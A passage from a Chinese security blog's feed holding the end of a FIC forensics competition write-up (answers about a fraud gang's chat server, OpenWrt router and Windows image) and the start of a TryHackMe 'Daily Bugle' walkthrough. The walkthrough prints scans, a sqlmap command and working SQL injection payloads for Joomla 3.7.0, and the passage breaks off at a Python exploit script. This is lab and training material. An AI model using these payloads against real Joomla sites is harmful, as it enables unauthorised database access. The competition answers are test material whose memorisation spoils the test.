class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   6 weeks ago   Up 8 minutes   0.0.0.0:3000-&gt;3000/tcp   rocketchat-rocketchat-1<br>929dad307aa4   bitnami/mongodb:5.0                                  <span class="hljs-string">&quot;/opt/bitnami/script…&quot;</span>   6 weeks ago   Up 8 minutes   27017/tcp                rocketchat-mongodb-1<br></code></pre></td></tr></table></figure><p>查看容器元数据发现可以空密码登录，端口在27017<br><img src="/img/blogimg/20240619094005457.png" alt="image.png"><br>但是本地这个端口没有服务在运行<br><img src="/img/blogimg/20240619094005459.png" alt="image.png"><br>查看容器元数据看到ip在172.18.0.2<br><img src="/img/blogimg/20240619094005461.png" alt="image.png"><br>navicat连接<br><img src="/img/blogimg/20240619094006463.png" alt="image.png"><br><img src="/img/blogimg/20240619094006464.png" alt="image.png"><br><img src="/img/blogimg/20240619094006465.png" alt="image.png"></p><blockquote><p>rocketchat服务器中，技术员提供的涉诈网站地址是？【答题格式：<a href="http://192.168.1.1】/">http://192.168.1.1】</a><br><a href="http://172.16.80.47/">http://172.16.80.47</a></p></blockquote><p><img src="/img/blogimg/20240619094006469.png" alt="image.png"></p><blockquote><p>综合分析服务器，该团伙的利润分配方案中，老李的利润占比是多少【答题格式：10%】<br>35%</p></blockquote><p>见上题</p><blockquote><p>综合分析服务器，该团队“杀猪盘”收网的可能时间段为<br>A.2024&#x2F;3&#x2F;15  15:00:00-16:00:00<br>B.2024&#x2F;3&#x2F;15  16:00:00-17:00:00<br>C.2024&#x2F;3&#x2F;15  17:00:00-18:00:00<br>D.2024&#x2F;3&#x2F;15  18:00:00-19:00:00</p></blockquote><p>见上题，UTC+8</p><blockquote><p>请综合分析，警方未抓获的重要嫌疑人，其使用聊天平台时注册邮箱号为？【答题格式：<a href="mailto:&#97;&#x62;&#99;&#64;&#x61;&#x61;&#x2e;&#99;&#x6f;&#x6d;">&#97;&#x62;&#99;&#64;&#x61;&#x61;&#x2e;&#99;&#x6f;&#x6d;</a>】<br><a href="mailto:&#x6c;&#x61;&#111;&#64;&#x73;&#117;&#46;&#x63;&#111;&#109;">&#x6c;&#x61;&#111;&#64;&#x73;&#117;&#46;&#x63;&#111;&#109;</a></p></blockquote><p>老苏的邮箱<br><img src="/img/blogimg/20240619094007485.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，该系统的主机名为【答题格式：MyPC】<br>iStoreOS</p></blockquote><p><img src="/img/blogimg/20240619094007489.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，该系统的内核版本为【答题格式：12.34.56】<br>5.10.201</p></blockquote><p><img src="/img/blogimg/20240619094007493.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，该静态ip地址为【答题格式：192.168.1.1】<br>192.168.8.5</p></blockquote><p>静态分析网卡配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iStoreOS:~<span class="hljs-comment"># cat /etc/config/network </span><br><br>config interface <span class="hljs-string">&#x27;loopback&#x27;</span><br>        option device <span class="hljs-string">&#x27;lo&#x27;</span><br>        option proto <span class="hljs-string">&#x27;static&#x27;</span><br>        option ipaddr <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>        option netmask <span class="hljs-string">&#x27;255.0.0.0&#x27;</span><br><br>config globals <span class="hljs-string">&#x27;globals&#x27;</span><br>        option ula_prefix <span class="hljs-string">&#x27;fdbc:6f08:9c51::/48&#x27;</span><br><br>config device<br>        option name <span class="hljs-string">&#x27;br-lan&#x27;</span><br>        option <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bridge&#x27;</span><br>        list ports <span class="hljs-string">&#x27;eth0&#x27;</span><br><br>config interface <span class="hljs-string">&#x27;lan&#x27;</span><br>        option device <span class="hljs-string">&#x27;br-lan&#x27;</span><br>        option ipaddr <span class="hljs-string">&#x27;192.168.8.5&#x27;</span><br>        option netmask <span class="hljs-string">&#x27;255.255.255.0&#x27;</span><br>        option ip6assign <span class="hljs-string">&#x27;60&#x27;</span><br>        option proto <span class="hljs-string">&#x27;dhcp&#x27;</span><br><br>loopback 接口：这是一个虚拟接口，用于本地回环。IP 地址为 127.0.0.1，子网掩码为 255.0.0.0。它用于在同一设备上测试网络服务，而无需实际发送数据包到网络。<br>globals 配置：这里定义了一个全局唯一本地地址（ULA）前缀，用于生成 IPv6 地址。<br>device 配置：这是一个设备定义，将物理接口 eth0 添加到名为 br-lan 的网桥上。网桥是一个虚拟设备，用于连接多个网络接口。<br>lan 接口：这是一个网络接口配置，用于连接局域网（LAN）。它的 IP 地址为 192.168.8.5，子网掩码为 255.255.255.0，并且使用 DHCP 协议自动获取 IP 地址。<br></code></pre></td></tr></table></figure><p>也可以结合计算机的浏览记录和<code>ip addr</code>确定<br><img src="/img/blogimg/20240619094008528.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，所用网卡的名称为【答题格式：abc123】<br>eth0</p></blockquote><p>见上题或登录后台查看<br>计算机镜像里面有密码<br><img src="/img/blogimg/20240619094008534.png" alt="image.png"><br><img src="/img/blogimg/20240619094008535.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，该系统中装的docker的版本号为【答题格式：12.34.56】<br>20.10.22</p></blockquote><p><img src="/img/blogimg/20240619094009539.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，nastools的配置文件路径为【答题格式：&#x2F;abc&#x2F;abc&#x2F;abc】<br>&#x2F;root&#x2F;Configs&#x2F;NasTools</p></blockquote><p><img src="/img/blogimg/20240619094009543.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，使用的vpn代理软件为【答题格式（忽略大小写）：abc123】<br>PassWall2</p></blockquote><p><img src="/img/blogimg/20240619094009547.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，vpn实际有多少个可用节点【答题格式：6】<br>53</p></blockquote><p>第一个结点为套餐情况，不是可用结点<br><img src="/img/blogimg/20240619094009552.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，节点socks的监听端口是多少【答题格式：1234】<br>1070</p></blockquote><p><img src="/img/blogimg/20240619094010556.png" alt="image.png"></p><blockquote><p>分析openwrt镜像，vpn的订阅链接是【答题格式：<a href="http://www.baidu.com/aaa/bbb/ccc/ddd?privatekey=abc123456789%E3%80%91">http://www.baidu.com/aaa/bbb/ccc/ddd?privatekey=abc123456789】</a><br><a href="https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a">https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a</a></p></blockquote><p><img src="/img/blogimg/20240619094010560.png" alt="image.png"></p><h1 id="windows镜像"><a href="#windows镜像" class="headerlink" title="windows镜像"></a>windows镜像</h1><blockquote><p>1.分析技术员赵某的windows镜像，并计算赵某计算机的原始镜像的SHA1值为？忽略大小写<br>FFD2777C0B966D5FC07F2BAED1DA5782F8DE5AD6</p></blockquote><p><img src="/img/blogimg/20240619094011565.png" alt="image.png"><br><img src="/img/blogimg/20240619094011566.png" alt="image.png"></p><blockquote><p>2.分析技术员赵某的windows镜像，疑似VeraCrypt加密容器的文件的SHA1值为？忽略大小写<br>b25e2804b586394778c800d410ed7bcdc05a19c8</p></blockquote><p>用火眼的特征分析得出，路径：检材3-计算机.E01&#x2F;分区6&#x2F;Users&#x2F;L&#x2F;Documents&#x2F;2024.fic，导出后计算sha1<br><img src="/img/blogimg/20240619094011571.png" alt="image.png"><br><img src="/img/blogimg/20240619094011572.png" alt="image.png"></p><blockquote><p>3.据赵某供述，他会将常用的密码放置在一个文档内，分析技术员赵某的windows镜像，找到技术员赵某的密码字典，并计算该文件的SHA1值?忽略大小写<br>E6EB3D28C53E903A71880961ABB553EF09089007</p></blockquote><p>路径：<code>检材3-计算机.E01/分区6/Users/L/Documents/</code><br><img src="/img/blogimg/20240619094012577.png" alt="image.png"></p><blockquote><p>4.据赵某供述，他将加密容器的密码隐写在一张图片内，隐写在图片中的容器密码是?<br>qwerasdfzxcv</p></blockquote><p>documents目录下有一张可疑图片，查看十六进制数据就能得到密码<br><img src="/img/blogimg/20240619094012582.png" alt="image.png"></p><p><img src="/img/blogimg/20240619094013584.png" alt="image.png"></p><blockquote><p>5.分析技术员赵某的windows镜像，bitlocker的恢复密钥是什么【答题格式：111111-222222-333333-444444-555555-666666-777777-888888】<br>404052-011088-453090-291500-377751-349536-330429-257235</p></blockquote><p>用刚才的密码解密2024.fic<br><img src="/img/blogimg/20240619094013589.png" alt="image.png"></p><blockquote><p>6.分析技术员赵某的windows镜像，bitlocker分区的起始扇区数是【答题格式：1024】<br>146794496</p></blockquote><p><img src="/img/blogimg/20240619094013593.png" alt="image.png"></p><blockquote><p>7.分析技术员赵某的windows镜像，默认的浏览器是<br>A.Chrome<br>B.Edge<br>C.IE<br>D.firefox</p><p>A</p></blockquote><p><img src="/img/blogimg/20240619094014600.png" alt="image.png"><br><img src="/img/blogimg/20240619094014601.png" alt="image.png"></p><blockquote><p>8.分析技术员赵某的windows镜像，私有聊天服务器的密码为【答题格式：abc123】<br>Zhao</p></blockquote><p>解密后的分区里面有一个私有聊天密码.txt，第一行应该是用户名<br><img src="/img/blogimg/20240619094014606.png" alt="image.png"></p><blockquote><p>9.分析技术员赵某的windows镜像，嫌疑人计算机中有疑似使用AI技术生成的进行赌博宣传的图片，该图片中，宣传的赌博网站地址为？【答题格式：<a href="http://www.baidu.com】/">www.baidu.com】</a><br><a href="http://www.585975.com/">www.585975.com</a></p></blockquote><p>仿真后翻一下加密盘的图片<br><img src="/img/blogimg/20240619094015611.png" alt="image.png"></p><blockquote><p>10.分析技术员赵某的windows镜像，赵某使用的AI换脸工具名称为？【答题格式：abcd】<br>A.stable diffusion<br>B.ROOP<br>C.Midjourney<br>D.DiffusionDraw</p><p>B</p></blockquote><p>powershell的历史记录里面有一个run.py，查找这个文件<br><img src="/img/blogimg/20240619094015619.png" alt="image.png"><br>都是在一个目录下面<br><img src="/img/blogimg/20240619094015621.png" alt="image.png"><br>进虚拟机里面看一下这个目录<br><img src="/img/blogimg/20240619094016623.png" alt="image.png"></p><blockquote><p>11.分析技术员赵某的windows镜像，使用AI换脸功能生成了一张图片，该图片的名称为【答题格式：1.txt】<br>db.jpg</p></blockquote><p>查看readme，结合执行的命令可知–output为输出结果<br><img src="/img/blogimg/20240619094016628.png" alt="image.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">.\python <span class="hljs-string">..</span>\run.py <span class="hljs-params">--source</span> <span class="hljs-string">&quot;E:/dst01.jpeg&quot;</span> <span class="hljs-params">--target</span> <span class="hljs-string">&quot;E:/1.pjpg&quot;</span> <span class="hljs-params">--output</span> <span class="hljs-string">&quot;E:/db.jpg&quot;</span> <span class="hljs-params">--frame-processor</span> face_swapper face_enhancer <span class="hljs-params">--similar-face-distance</span> 0.85 <span class="hljs-params">--temp-frame-format</span> png <span class="hljs-params">--temp-frame-quality</span> 18 <span class="hljs-params">--output-video-quality</span> 18 <span class="hljs-params">--max-memory</span> 4 <span class="hljs-params">--execution-provider</span> cpu <span class="hljs-params">--execution-threads</span> 4<br></code></pre></td></tr></table></figure><blockquote><p>12.分析技术员赵某的windows镜像，ai换脸生成图片的参数中–similar-face-distance值为【答题格式：20.12】<br>0.85</p></blockquote><p>见上题</p><blockquote><p>13.分析技术员赵某的windows镜像，嫌疑人使用AI换脸功能所使用的原始图片名称为【答题格式：abc.txt】<br>dst01.jpeg</p></blockquote><p>见上上题</p><blockquote><p>14.分析技术员赵某的windows镜像，赵某与李某沟通中提到的“二维码”解密所用的网站url地址为？【答题格式：<a href="http://www.baidu.com/1.html%E3%80%91">http://www.baidu.com/1.html】</a><br><a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p></blockquote><p>查看浏览器历史记录<br><img src="/img/blogimg/20240619094016644.png" alt="image.png"></p><blockquote><p>15.分析技术员赵某的windows镜像，赵某架设聊天服务器的原始IP地址为？【答题格式：192.168.1.1】<br>192.168.8.17</p></blockquote><p><img src="/img/blogimg/20240619094017648.png" alt="image.png"><br><img src="/img/blogimg/20240619094017649.png" alt="image.png"></p><blockquote><p>16.分析技术员赵某的windows镜像，据赵某交代，其在窝点中直接操作服务器进行部署，环境搭建好了之后，使用个人计算机登录聊天室进行沟通，请分析赵某第一次访问聊天室的时间为？<br>A.2024-03-14 20:30:08<br>B.2024-03-14 20:31:08<br>C.2024-03-14 20:32:08<br>D.2024-03-14 20:33:08</p><p>C</p></blockquote><p><img src="/img/blogimg/20240619094017656.png" alt="image.png"></p><blockquote><p>17.分析技术员赵某的windows镜像，openwrt的后台管理密码是<br>hl@7001</p></blockquote><p>结合前面的服务器集群来看，openwrt的网址：<br><img src="/img/blogimg/20240619094018661.png" alt="image.png"><br><img src="/img/blogimg/20240619094018662.png" alt="image.png"></p><blockquote><p>18.分析技术员赵某的windows镜像，嫌疑人可能使用什么云来进行文件存储？【答题格式：阿里云】<br>易有云</p></blockquote><p><img src="/img/blogimg/20240619094018666.png" alt="image.png"></p><blockquote><p>19.分析技术员赵某的windows镜像，工资表密码是多少【答题格式：abc123】<br>aa123456</p></blockquote><p>BitLocker加密分区中有一个名单.xlsx<br><img src="/img/blogimg/20240619094019671.png" alt="image.png"><br>结合运维笔记，用commonPwd.txt暴力破解<br><img src="/img/blogimg/20240619094019673.png" alt="image.png"><br><img src="/img/blogimg/20240619094019674.png" alt="image.png"><br><img src="/img/blogimg/20240619094019675.png" alt="image.png"></p><blockquote><p>20.分析技术员赵某的windows镜像，张伟的工资是多少【答题格式：20】<br>28300</p></blockquote><p><img src="/FIC/20240619094019679.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">第四届FIC取证竞赛复盘</summary>
    
    
    
    <category term="取证" scheme="https://cvbxy.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="取证" scheme="https://cvbxy.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
    <category term="FIC" scheme="https://cvbxy.github.io/tags/FIC/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe-Daily Bugle</title>
    <link href="https://cvbxy.github.io/2023/07/23/Daily/"/>
    <id>https://cvbxy.github.io/2023/07/23/Daily/</id>
    <published>2023-07-23T09:52:10.000Z</published>
    <updated>2023-07-23T10:01:19.386Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><blockquote><p>Access the web server, who robbed the bank?<br>answer：spiderman</p></blockquote><p>访问10.10.223.240，看到一篇文章</p><p><img src="/img/blogimg/Untitled-1690106092973-8.png"></p><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>nmap：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gradle">PORT     STATE SERVICE<br><span class="hljs-number">22</span>/tcp   open  ssh<br><span class="hljs-number">80</span>/tcp   open  http<br><span class="hljs-number">3306</span>/tcp open  mysql<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">80</span><span class="hljs-regexp">/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/</span><span class="hljs-number">5.6</span>.<span class="hljs-number">40</span>)<br>|_http-title: Home<br>|_http-generator: Joomla! - Open <span class="hljs-keyword">Source</span> Content Management<br>|_http-server-header: Apache<span class="hljs-regexp">/2.4.6 (CentOS) PHP/</span><span class="hljs-number">5.6</span>.<span class="hljs-number">40</span><br>| http-robots.txt: <span class="hljs-number">15</span> disallowed entries <br>| <span class="hljs-regexp">/joomla/</span>administrator<span class="hljs-regexp">/ /</span>administrator<span class="hljs-regexp">/ /</span>bin<span class="hljs-regexp">/ /</span>cache/ <br>| <span class="hljs-regexp">/cli/</span> <span class="hljs-regexp">/components/</span> <span class="hljs-regexp">/includes/</span> <span class="hljs-regexp">/installation/</span> <span class="hljs-regexp">/language/</span> <br>|_<span class="hljs-regexp">/layouts/</span> <span class="hljs-regexp">/libraries/</span> <span class="hljs-regexp">/logs/</span> <span class="hljs-regexp">/modules/</span> <span class="hljs-regexp">/plugins/</span> <span class="hljs-regexp">/tmp/</span><br><span class="hljs-number">3306</span>/tcp open  mysql   MariaDB (unauthorized)<br></code></pre></td></tr></table></figure><p>目录扫描：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xl">/<span class="hljs-function"><span class="hljs-title">administrator</span>        (Status: 301) [Size: 243] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/administrator/]</span><br>/<span class="hljs-function"><span class="hljs-title">bin</span>                  (Status: 301) [Size: 233] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/bin/]</span><br>/<span class="hljs-function"><span class="hljs-title">cache</span>                (Status: 301) [Size: 235] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/cache/]</span><br>/<span class="hljs-function"><span class="hljs-title">components</span>           (Status: 301) [Size: 240] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/components/]</span><br>/<span class="hljs-function"><span class="hljs-title">images</span>               (Status: 301) [Size: 236] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/images/]</span><br>/<span class="hljs-function"><span class="hljs-title">includes</span>             (Status: 301) [Size: 238] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/includes/]</span><br>/index.php            (Status: <span class="hljs-number">200</span>) [Size: <span class="hljs-number">9280</span>]<br>/<span class="hljs-function"><span class="hljs-title">language</span>             (Status: 301) [Size: 238] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/language/]</span><br>/<span class="hljs-function"><span class="hljs-title">layouts</span>              (Status: 301) [Size: 237] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/layouts/]</span><br>/<span class="hljs-function"><span class="hljs-title">libraries</span>            (Status: 301) [Size: 239] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/libraries/]</span><br>/<span class="hljs-function"><span class="hljs-title">media</span>                (Status: 301) [Size: 235] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/media/]</span><br>/<span class="hljs-function"><span class="hljs-title">modules</span>              (Status: 301) [Size: 237] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/modules/]</span><br>/<span class="hljs-function"><span class="hljs-title">plugins</span>              (Status: 301) [Size: 237] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/plugins/]</span><br>/robots.txt           (Status: <span class="hljs-number">200</span>) [Size: <span class="hljs-number">836</span>]<br>/<span class="hljs-function"><span class="hljs-title">templates</span>            (Status: 301) [Size: 239] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/templates/]</span><br>/<span class="hljs-function"><span class="hljs-title">tmp</span>                  (Status: 301) [Size: 233] [--&gt;</span> http:<span class="hljs-comment">//10.10.223.240/tmp/]</span><br></code></pre></td></tr></table></figure><p>访问<code>/administrator</code></p><p><img src="/img/blogimg/Untitled4.png"></p><blockquote><p>What is the Joomla version?</p></blockquote><p>没什么信息，找个cms识别工具测一下版本</p><p><img src="/img/blogimg/Untitled5.png"></p><p>找一下这个版本的漏洞</p><p><img src="/img/blogimg/Untitled6.png"></p><p>exp：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"># Exploit Title: Joomla <span class="hljs-number">3.7</span><span class="hljs-number">.0</span> <span class="hljs-operator">-</span> <span class="hljs-keyword">Sql</span> Injection<br># <span class="hljs-type">Date</span>: <span class="hljs-number">05</span><span class="hljs-number">-19</span><span class="hljs-number">-2017</span><br># Exploit Author: Mateus Lino<br># Reference: https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>blog.sucuri.net<span class="hljs-operator">/</span><span class="hljs-number">2017</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span><span class="hljs-keyword">sql</span><span class="hljs-operator">-</span>injection<span class="hljs-operator">-</span>vulnerability<span class="hljs-operator">-</span>joomla<span class="hljs-number">-3</span><span class="hljs-number">-7.</span>html<br># Vendor Homepage: https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.joomla.org<span class="hljs-operator">/</span><br># Version: <span class="hljs-operator">=</span> <span class="hljs-number">3.7</span><span class="hljs-number">.0</span><br># Tested <span class="hljs-keyword">on</span>: Win, Kali Linux x64, Ubuntu, Manjaro <span class="hljs-keyword">and</span> Arch Linux<br># CVE : <span class="hljs-operator">-</span> CVE<span class="hljs-number">-2017</span><span class="hljs-number">-8917</span><br><br>URL Vulnerable: http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>index.php?option<span class="hljs-operator">=</span>com_fields<span class="hljs-operator">&amp;</span><span class="hljs-keyword">view</span><span class="hljs-operator">=</span>fields<span class="hljs-operator">&amp;</span>layout<span class="hljs-operator">=</span>modal<span class="hljs-operator">&amp;</span>list[fullordering]<span class="hljs-operator">=</span>updatexml<span class="hljs-operator">%</span><span class="hljs-number">27</span><br><br><span class="hljs-keyword">Using</span> Sqlmap: <br><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="hljs-comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><br><span class="hljs-keyword">Parameter</span>: list[fullordering] (<span class="hljs-keyword">GET</span>)<br>    Type: <span class="hljs-type">boolean</span><span class="hljs-operator">-</span>based blind<br>    Title: <span class="hljs-type">Boolean</span><span class="hljs-operator">-</span>based blind <span class="hljs-operator">-</span> <span class="hljs-keyword">Parameter</span> replace (DUAL)<br>    Payload: option<span class="hljs-operator">=</span>com_fields<span class="hljs-operator">&amp;</span><span class="hljs-keyword">view</span><span class="hljs-operator">=</span>fields<span class="hljs-operator">&amp;</span>layout<span class="hljs-operator">=</span>modal<span class="hljs-operator">&amp;</span>list[fullordering]<span class="hljs-operator">=</span>(<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1573</span><span class="hljs-operator">=</span><span class="hljs-number">1573</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1573</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">1573</span><span class="hljs-operator">*</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1573</span> <span class="hljs-keyword">FROM</span> DUAL <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">9674</span> <span class="hljs-keyword">FROM</span> DUAL) <span class="hljs-keyword">END</span>)<br><br>    Type: error<span class="hljs-operator">-</span>based<br>    Title: MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">5.0</span> error<span class="hljs-operator">-</span>based <span class="hljs-operator">-</span> <span class="hljs-keyword">Parameter</span> replace (FLOOR)<br>    Payload: option<span class="hljs-operator">=</span>com_fields<span class="hljs-operator">&amp;</span><span class="hljs-keyword">view</span><span class="hljs-operator">=</span>fields<span class="hljs-operator">&amp;</span>layout<span class="hljs-operator">=</span>modal<span class="hljs-operator">&amp;</span>list[fullordering]<span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-number">6600</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),CONCAT(<span class="hljs-number">0x7171767071</span>,(<span class="hljs-keyword">SELECT</span> (ELT(<span class="hljs-number">6600</span><span class="hljs-operator">=</span><span class="hljs-number">6600</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">0x716a707671</span>,<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)<br><br>    Type: <span class="hljs-keyword">AND</span><span class="hljs-operator">/</span><span class="hljs-keyword">OR</span> <span class="hljs-type">time</span><span class="hljs-operator">-</span>based blind<br>    Title: MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> <span class="hljs-type">time</span><span class="hljs-operator">-</span>based blind <span class="hljs-operator">-</span> <span class="hljs-keyword">Parameter</span> replace (substraction)<br>    Payload: option<span class="hljs-operator">=</span>com_fields<span class="hljs-operator">&amp;</span><span class="hljs-keyword">view</span><span class="hljs-operator">=</span>fields<span class="hljs-operator">&amp;</span>layout<span class="hljs-operator">=</span>modal<span class="hljs-operator">&amp;</span>list[fullordering]<span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span>(SLEEP(<span class="hljs-number">5</span>)))GDiu)<br></code></pre></td></tr></table></figure><p>sqlmap太慢了，找了个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 